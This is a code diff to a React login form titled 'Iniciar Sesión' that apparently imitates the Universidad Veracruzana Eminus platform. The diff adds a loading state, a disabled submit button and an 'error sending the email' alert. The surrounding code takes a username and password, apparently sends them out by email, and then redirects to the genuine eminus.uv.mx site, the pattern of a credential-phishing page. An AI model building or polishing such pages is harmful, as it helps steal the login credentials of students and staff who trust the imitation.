@@ -17,9 +17,11 @@ const App = () => {
 
   const [user, setUser] = useState("");
   const [password, setPassword] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
 
   const onSubmit = async (e) => {
     e.preventDefault();
+    setIsLoading(true);
 
     if (user === "" || password === "") {
       setIsUser(true);
@@ -61,8 +63,9 @@ const App = () => {
           location.href = "https://eminus.uv.mx/eminus4";
         }
       })
-      .catch((err) => {
-        console.log(err);
+      .catch(() => {
+        alert("Error al enviar el correo");
+        setIsLoading(false);
       });
   };
 
@@ -167,8 +170,14 @@ const App = () => {
 
           <div className="text-center flex flex-col gap-2 w-full my-4">
             <button
-              className="w-full h-[34px] rounded-[4px] text-[13px] font-roboto px-[15px] bg-[#22891f] text-white border-[1px] border-solid border-[#22891f]"
+              className={clsx(
+                "w-full h-[34px] rounded-[4px] text-[13px] font-roboto px-[15px] text-white border-[1px] border-solid border-[#22891f]",
+                isLoading
+                  ? "bg-[#2c742f] after:opacity-[.8] after:content-[' ']"
+                  : "bg-[#22891f]"
+              )}
               type="submit"
+              disabled={isLoading}
             >
               Iniciar Sesión
             </button>
